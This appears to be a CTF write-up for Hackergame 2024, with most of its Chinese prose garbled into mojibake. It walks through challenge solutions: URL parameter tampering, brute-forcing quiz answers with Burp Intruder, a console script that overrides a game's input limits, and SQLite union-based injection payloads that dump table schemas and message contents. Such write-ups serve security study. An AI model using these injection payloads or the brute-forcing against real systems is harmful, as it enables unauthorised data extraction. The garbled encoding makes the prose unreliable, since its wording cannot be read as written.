## å‰è¨€
[My blog](https://jackeyzzz12138.github.io/2024/11/12/wp02/)

å½“å‰åˆ†æ•°ï¼š1500ï¼Œ æ€»æ’åï¼š416 / 2460
AIï¼š0 ï¼Œ binaryï¼š0 ï¼Œ generalï¼š850 ï¼Œ mathï¼š0 ï¼Œ webï¼š650

> æœ‰ç‚¹è¿›æ­¥ï¼Œä½†è¿›æ­¥ä¸å¤§hh

ä»Šå¹´æ²¡æœ‰å¤ªå¤šçš„æ—¶é—´æ‰“æ¯”èµ›äº†ï¼Œä½†æ˜¯ç¡®å®æ„Ÿå…´è¶£ï¼Œè¿˜æ˜¯æŠ½äº†ç‚¹æ—¶é—´åšäº†ä¸€ä¸‹ï¼Œå†åŠ ä¸Šåˆšåˆšç»“æŸäº†ä¸€æ®µæ—…ç¨‹ï¼Œæ‰€ä»¥ä»Šå¤©æŠŠWPè¡¥ä¸€ä¸‹ï¼Œä¹Ÿåˆ†äº«ä¸€ä¸‹è‡ªå·±åœ¨åšé¢˜æ—¶å€™çš„ä¸€äº›å¥‡æŠ€æ·«å·§ã€‚

## ä»¥ä¸‹æŒ‰ç…§å®˜æ–¹é¢˜ç›®é¡ºåºè¿›è¡Œæ’åˆ—

### ç­¾åˆ°
è¿›å…¥é¢˜ç›®ï¼Œæ„Ÿå—åˆ°ä¸€è‚¡æµ“çƒˆçš„æ²™å¨ç›+sunoå‘³å„¿ã€‚è¿™ä¸ªå®Œå…¨ä¸åƒæ˜¯60ç§’å°±å®Œæˆçš„ä»»åŠ¡å˜›ï¼Œç­‰ä»–å¤±è´¥çœ‹ä¼šæ€ä¹ˆæ ·ã€‚æœç„¶ï¼Œlinkä¸­æœ‰
```
http://xxx.xx.xx.xxx:12024/?pass=false
```
ä¸€ä¸ªæ˜æ˜¾çš„GETæ–¹æ³•ï¼ŒæŠŠ false æ”¹æˆ trueï¼Œflagå°±å‡ºæ¥äº†ã€‚

### å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€
å…ˆå¼€å§‹æ€è·¯é”™äº†ï¼Œåœ¨GitHubä»“åº“æ‰¾flagï¼Œç„¶åæ‰å‘ç°äº†è¿™ä¸ªterminalé£æ ¼çš„[link](https://www.nebuu.la/)ã€‚ç„¶åéœ€è¦æŠ˜è…¾ä¸€ä¸‹çœ‹æœ‰ä»€ä¹ˆå‘½ä»¤å¯ä»¥è¾“å…¥(è¾“å…¥ help)ã€‚   
PS. sudo æœ‰å½©è›‹ã€‚
#### Checkin Again  
è¿™ä¸ªåè€Œæ˜¯ç¬¬äºŒä¸ªè§£å‡ºæ¥çš„ï¼Œ
å‘½ä»¤`env`ä¸­æœ‰flagã€‚
#### Checkin Again & Again
lsåˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼Œæƒ³è¿›å…¥æ–‡ä»¶å¤¹ï¼Œå‘ç°è¦æƒé™ï¼Œsudoå‘ç°å½©è›‹ã€‚
ç„¶å `ls -a` åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼ˆå› ä¸ºå¯èƒ½æœ‰éšè—æ–‡ä»¶ï¼‰ï¼Œæœç„¶æœ‰ `.flag`ï¼Œcat ä¸€ä¸‹å°±èƒ½å¾—åˆ°è¿™é“é¢˜flagã€‚

### çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

> ç¬¬ä¸€æ¬¡æ‹¿åˆ°å…¨åˆ†äº†ï¼

#### 1
è¿™é“é¢˜æœ‰ç‚¹éš¾æ‰¾ï¼Œæ¯•ç«Ÿæœ‰ç‚¹å¤æ—©äº†ã€‚å¼€å§‹åœ¨**ç™¾åº¦**ç›´æ¥å¯»æ‰¾æœªæœï¼Œä½†æ˜¯åœ¨è¿™ä¸ª[link](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/)ï¼Œå‘ç°æœ‰ç¬¬äºŒå±Šä¿¡æ¯å®‰å…¨å¤§èµ›çš„å­˜æ¡£ï¼Œæ¨ç®—ä¸€ä¸‹å°±æ˜¯2015å¹´å•¦ã€‚

#### 2
ç»§ç»­åœ¨é‚£ä¸ªå­˜æ¡£é¡µé¢ï¼Œå¯ä»¥çœ‹æ–°é—»ç¨¿ä¸€ä¸ªä¸ªè¯•ï¼Œä¹Ÿå¯ä»¥æ•°ä¸€ä¸‹é¢˜ç›®ç¡®å®šæ˜¯å“ªä¸€å±Šåå†å¡«ã€‚

#### 3
æœç´¢â€œhackergame 2018â€ï¼Œåº”è¯¥å¯ä»¥çœ‹åˆ°å…¶ä»–å¸ˆå‚…çš„WPï¼Œä¼šå‘ç°é‚£ä¸€å¹´æœ‰é“é¢˜æ˜¯æ‰¾ä¹¦åï¼Œé‚£ä¹ˆå°±æ˜¯é‚£æœ¬äº†ã€‚

#### 4
å‘USENIXè¿™ç§Aä¼šå¤§æ¦‚ç‡è¦å‘æ–°é—»ç¨¿å®£ä¼ ä¸€ä¸‹hhï¼Œéµå¾ªè¿™ä¸ªæ€è·¯ï¼Œæœç´¢å¼•æ“æ£€ç´¢â€œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ usenixâ€,å¯ä»¥æœç´¢åˆ°è¿™ç¯‡è®ºæ–‡å’Œä½œè€…ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹æ±‡æŠ¥PPTï¼Œå‘ç°è¿™ä¸ªä½œè€…å®éªŒç”¨äº† `16 email services and 20 clients`ï¼Œ16 * 20 = 320(å¿½ç•¥äº†web interface)ï¼Œå†åŠ 16æ‰æ˜¯æ­£ç¡®ç­”æ¡ˆï¼Œæˆ‘çš„æ–¹æ³•è¯·è§å¥‡æŠ€æ·«å·§ã€‚

#### 5
ç´§è·Ÿå®äº‹ï¼é¦–å…ˆï¼Œåœ¨GitHubä¸Šæœç´¢Linuxçš„ä»“åº“ï¼Œstaræœ€å¤šçš„å°±æ˜¯ã€‚æ‰¾åˆ°maintaineræ–‡ä»¶ç‚¹è¿›å»ï¼Œçœ‹historyã€‚è¯„è®ºæœ€å¤šçš„é‚£æ¡å°±æ˜¯hhh

![maintainer](./images/MAINTAINER.jpg)

#### 6
ä¸ä¼šï¼Œç›´æ¥å¥‡æŠ€æ·«å·§ã€‚

#### å¥‡æŠ€æ·«å·§
Burp suite Intruderçˆ†ç ´ï¼Œç”±äº4ï¼Œ6ä¸¤é¢˜éƒ½æ˜¯éè´Ÿæ•´æ•°ï¼Œé‚£ä¹ˆå°±å¾ˆç®€å•äº†ï¼Œå†µä¸”ç¬¬å››é¢˜æœ‰ä¸ªå¤§è‡´çš„èŒƒå›´ï¼Œä½ çš„æ¯ä¸€æ¬¡å›ç­”é¡µé¢ä¼šå›æ˜¾ä½ çš„åˆ†æ•°ï¼Œç›´æ¥æŠŠåˆ†æ•°ç­›å‡ºæ¥å°±è¡Œäº†ã€‚ç¬¬å…­é¢˜çš„è¯ï¼Œä¹Ÿå¾ˆå¿«æˆ‘é€‰çš„èŒƒå›´æ˜¯1-100000ï¼Œçœ‹åˆ°åˆ†æ•°æœ‰å˜åŒ–å°±ç›´æ¥åœå°±å¥½äº†ã€‚

### æ‰“ä¸å¼€çš„ç›’
macOS Xcodeä¸­æœ‰èƒ½æŸ¥çœ‹æ¨¡å‹æ–‡ä»¶(.stl)çš„å·¥å…·ï¼Œç›´æ¥è¿›å»çœ‹å•ŠğŸ¤ªã€‚

### æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼
> ä½¿ç”¨å·¥å…·ï¼šPDFgearï¼ˆçœŸæ²¡æ°é¥­ 
> 
ä¸‹è½½è®ºæ–‡åæœç´¢ `flag`,å‘ç°é¡µé¢ä¸Šå¹¶æ²¡æœ‰æ˜¾ç¤ºï¼Œä½†æ˜¯ç¡®å®æœ‰flagå­—æ ·ï¼Œä½¿ç”¨PDF to txtåï¼Œå¹¶æ²¡æœ‰å‘ç°flagï¼Œå†æ¬¡å°è¯•PDF to Wordï¼Œå‘ç°é‚£ä¸ªä½ç½®åº•å±‚æœ‰ä¸€å¼ å›¾ç‰‡ï¼Œæ‹–å‡ºæ¥å‘ç°wocï¼Œflagï¼  
![paper](./images/paper.jpg)

### æ¯”å¤§å°ç‹
æ„Ÿè§‰å’Œå»å¹´çš„ç‚¹å‡»flagæ’¤å›é‚£é“é¢˜å¾ˆåƒï¼Œæ‰€ä»¥æˆ‘æ„Ÿè§‰æ€è·¯è¿˜æ˜¯å†™JSï¼Œç„¶ååœ¨consoleæ‰§è¡Œã€‚  
åœ¨Claudeçš„å¸®åŠ©ä¸‹å†™äº†å‡ ä¸ªè‡ªåŠ¨åŒ–ç‚¹å‡»çš„è„šæœ¬ï¼Œå‘ç°æ— è®ºå¦‚ä½•éƒ½æ¯”å°å­©å“¥æ…¢ã€‚(çœ‹äº†å®˜æ–¹é¢˜è§£ï¼ŒåŸæ¥æ˜¯é™åˆ¶äº†è¾“å…¥é¢‘ç‡ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹setTimeoutçš„æ—¶é—´) æˆ‘å½“æ—¶çš„æ€è·¯æ˜¯ï¼Œç”¨æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥å¯èƒ½æ›´å¿«ï¼Ÿå®ƒposté‡Œçš„state.Inputå’Œstate.stopUpdateè¿›è¡Œä¿®æ”¹åå¯èƒ½å¯ä»¥è§£é™¤ä¸€äº›è¾“å…¥é™åˆ¶ï¼Ÿç»“æœç¡®å®é€Ÿåº¦å˜å¿«äº†ï¼Œè€Œä¸”å¾—åˆ°äº†flagï¼ŒåŸå› å¯èƒ½ä¹Ÿæ˜¯è¿™æ ·ï¼Ÿå¸Œæœ›æœ‰ä¸ªæœ‰ç¼˜äººæ¥è¿›è¡Œæ¢è®¨ã€‚
``` JavaScript
function simulateKeyPress(key) {
    const event = new KeyboardEvent('keydown', {
        key: key,
        code: key,
        charCode: key.charCodeAt(0),
        keyCode: key.charCodeAt(0),
        which: key.charCodeAt(0),
        bubbles: true,
        cancelable: true
    });
    document.dispatchEvent(event);
}
var counts = 0

setInterval(() => {
    state.allowInput = true 
    state.stopUpdate = false

	var value1 = document.getElementById("value1").textContent;
	var value2 = document.getElementById("value2").textContent;

	var number1 = parseInt(value1, 10);
	var number2 = parseInt(value2, 10);
    if (number1 < number2) {
//        document.getElementById("less-than").click();
		simulateKeyPress('ArrowLeft')
		counts++
    } else {
//        document.getElementById("greater-than").click();
		simulateKeyPress('ArrowRight')
		counts++
    }
    
    if (counts == 100) {
    	clearInterval()
        console.log("stop")
    }
}, 80);

```

### æ—…è¡Œç…§ç‰‡4.0

å†™åœ¨å‰é¢ï¼šéšç€ç§»åŠ¨äº’è”ç½‘çš„å‘å±•ï¼Œå¾ˆå¤šå¸¸ç”¨çš„ç§»åŠ¨è½¯ä»¶ä¹Ÿæ‹¥æœ‰äº†éå¸¸ä¸°å¯Œçš„åœ°ç†ä½ç½®æ•°æ®ï¼Œè§£é¢˜ä¸­ç”¨åˆ°äº†ä¸€äº›ç›¸å…³çš„appè¯·çœ‹å…·ä½“é¢˜è§£ã€‚

#### 1-2

æŠŠå›¾ç‰‡æ”¾åˆ°ç™¾åº¦å»æœç´¢å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°å…·ä½“çš„ä½ç½®ã€‚  
![kelikeqi](./images/kelikeqi.jpg)

ACGç›¸å…³å†…å®¹å¾ˆå®¹æ˜“linkåˆ°å“”å“©å“”å“©ï¼Œäºæ˜¯ä½ ä¼šé¡ºè—¤æ‘¸ç“œæ‰¾åˆ°ç§‘å¤§ACGçš„å®˜æ–¹è¿è¥è´¦å·ï¼Œç¿»çœ‹ä»–çš„åŠ¨æ€ã€‚  
![bili](./images/bili.jpg)

#### 3-4
ç¬¬ä¸€å¼ å›¾ï¼Œæ”¾åœ¨æœç´¢å¼•æ“æœå›¾å¤§æ¦‚ç‡å¾—ä¸åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œä½†ä½ å¯ä»¥åœ¨å³ä¸‹è§’çš„åƒåœ¾æ¡¶ä¸Šçœ‹åˆ° `å…­å®‰xx`ï¼Œå¥½çš„å·²ç»ç¡®å®šåŸå¸‚äº†ã€‚å¯ä»¥åœ¨**å°çº¢ä¹¦**ç›´æ¥æœç´¢å…­å®‰å…¬å›­ç›¸å…³çš„å†…å®¹å°±è¡Œäº†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è·¯ä¸Šçš„å½©è‰²çº¿æ¡æ¥ç¼©å°èŒƒå›´ã€‚

ç¬¬äºŒå¼ å›¾ï¼Œæ”¾åœ¨æœç´¢å¼•æ“ä¸­å¯ä»¥æœåˆ°ä¸€ä¸ªå¤§è‡´çš„å†…å®¹ï¼Œå¤§æ¦‚åœ¨ä¸‰å³¡çš„ä¸€ä¸ªæ™¯è§‚ï¼Œä½†æ˜¯ä¸çŸ¥é“å…·ä½“åœ¨é‚£ä¸ªæ™¯ç‚¹ï¼Œè€Œä¸”è¿™ä¸ªçŸ³å¤´å¥½åƒå«æˆªæµçŸ³ã€‚å°çº¢ä¹¦ä¸Šç»§ç»­æ·±å…¥æŸ¥è¯¢ï¼Œæˆ‘çœ‹åˆ°çš„å¥½åƒæ˜¯ä¸€ä¸ªå¤§å”å‘çš„è§†é¢‘ï¼ŒçŸ¥é“äº†è¿™ä¸ªæ™¯ç‚¹åå­—ã€‚

#### 5-6
é¦–å…ˆé€šè¿‡é¢˜ç›®å¯ä»¥å¾—çŸ¥å…³é”®ä¿¡æ¯â€œå››ç¼–ç»„åŠ¨è½¦â€, Google it, å¯ä»¥å‘ç°ä¸€ä¸ª[link](https://www.china-emu.cn/EN/Trains/Model/Detail-26012-201-S.html),å¾ˆæ¸…æ¥šçš„æ ‡å‡ºäº†è¿™ä¸ªç¬¬å…­é¢˜çš„ç­”æ¡ˆã€‚

è§£ç­”ç¬¬äº”é¢˜ä¹‹å‰ä½ éœ€è¦å…ˆçŸ¥é“è¿™ä¸ªåˆ—è½¦ä¹Ÿå«åšæ€€å¯†å·ï¼Œè¿˜æœ‰å®ƒçš„è¡Œé©¶è·¯çº¿ï¼ˆç”¨äº’è”ç½‘æœç´¢ï¼‰ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹å‡ºå¯†é›†çš„é“è½¨å¤§æ¦‚ç‡å°±æ˜¯è½¦ç«™ï¼Œé‚£ä¹ˆå°±é€šè¿‡å«æ˜Ÿåœ°å›¾å¯¹æ¯ä¸ªç«™ç‚¹è¿›è¡Œæœç´¢ï¼Œæ¯”å¯¹å°±è¡Œäº†ã€‚
> è½¦ç«™é™„è¿‘çš„åŒ»é™¢ä¹Ÿæ²¡é‚£ä¹ˆå¤šï¼Œæˆ–è®¸è¯•é”™æˆæœ¬ä¹Ÿä¸å¤ªé«˜ï¼Ÿ

### PaoluGPT
> ä½¿ç”¨å·¥å…·ï¼šHackbar

**basic**  (é¸£è°¢Hello-ctfï¼Œæ¢å§¬è€å¸ˆ)
![database](https://nssctf.wdf.ink//img/WDTJ/202304261646646.png)  

ä¸‹è½½é¢˜ç›®æºç åå‘ç°ï¼Œå…¶å®æ˜¯ä¸€é“SQLæ³¨å…¥é¢˜ï¼Œè€Œä¸”ç”¨çš„è¿˜æ˜¯SQLiteï¼ˆæœ‰äº›æ•°æ®åº“æœ‰è‡ªå·±çš„è¯­è¨€å†™æ³•ï¼‰ã€‚æ‰€ä»¥ä¸¤ä¸ªflagåº”è¯¥å¯ä»¥ä¸€èµ·å¾—åˆ°ã€‚  
ä»é¢˜ç›®å¾—çŸ¥flagåº”è¯¥æœ‰ä¸¤ä¸ªä¸”å°±åœ¨èŠå¤©è®°å½•ä¸­ï¼Œéšæœºç‚¹è¿›ä¸€ä¸ªèŠå¤©è®°å½•å¯ä»¥çœ‹åˆ°urlæ­¤æ—¶æ˜¯è¿™ç§ç±»å‹

```
//éšè—äº†å…·ä½“urlå’Œconversation_id
https://xxx.xx:8443/view?conversation_id=blabla
```
è”æƒ³åˆ°æºä»£ç ä¸­çš„
```python
results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```
åˆ©ç”¨å•å¼•å·çš„é—­åˆå¯ä»¥å¾ˆå¿«æ„é€ ä¸€äº›SQLè¯­å¥æ¥åˆ©ç”¨ï¼Œè­¬å¦‚
```
// dump å‡ºåˆ—æ•°ï¼Œå°±è¿™é“é¢˜æ¥è¯´å°±æ˜¯2ï¼Œå…¶å®åç«¯ä»£ç ä¹Ÿæœ‰è¯´æ˜¯ä¸¤ä¸ªè¿”æ˜¾ç‚¹
https://xxx.xx:8443/view?conversation_id=blabla' order by 2 --

// Hackbar dump tablesï¼Œå…¶å®åç«¯ä»£ç ä¹Ÿæœ‰ï¼Œä½†æ˜¯è¯·è®°ä½è¿™ä¸ªgroup_concat å‡½æ•°ã€‚ä½ å¯ä»¥å¾—åˆ°è¿™ä¸ªtableåå­—
https://xxx.xx:8443/view?conversation_id=blabla' union select group_concat(name),2 from sqlite_master WHERE type='table'--

// Hackbar dump column namesï¼Œä½ å¯ä»¥å¾—åˆ°æ¯ä¸ªåˆ—çš„åå­—å’Œä»–çš„å˜é‡ç±»å‹ã€‚
https://xxx.xx:8443/view?conversation_id=blabla' union select group_concat(sql),2 from sqlite_master WHERE type='table'--

```
ä¸Šé¢çš„æ˜¯ä¸€ç§å¸¸è§„æ€è·¯å§ï¼Œå…¶å®é¢˜ç›®æºä»£ç å¾ˆå¤šéƒ½æœ‰ä¸éœ€è¦é€šè¿‡æ³¨å…¥å¾—åˆ°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸€æŠŠæ¢­ã€‚
```
https://xxx.xx:8443/view?conversation_id=blabla'union select group_concat(contents),2 from messages--
```
ä»messagesä¸­å–å‡ºcontentsåˆ—çš„æ‰€æœ‰å†…å®¹ï¼Œè¿™æ—¶ä½ çš„æµè§ˆå™¨åº”è¯¥å›äº†å¾ˆå¤šå†…å®¹ï¼Œè¿™æ—¶ctrl+få¯»æ‰¾å§ã€‚

## åè®°
å¦‚æœ‰é”™è¯¯ï¼Œæ¬¢è¿æŒ‡æ­£ï¼Œä¹Ÿæ¬¢è¿æ¢è®¨å„ç§Geek thingsã€‚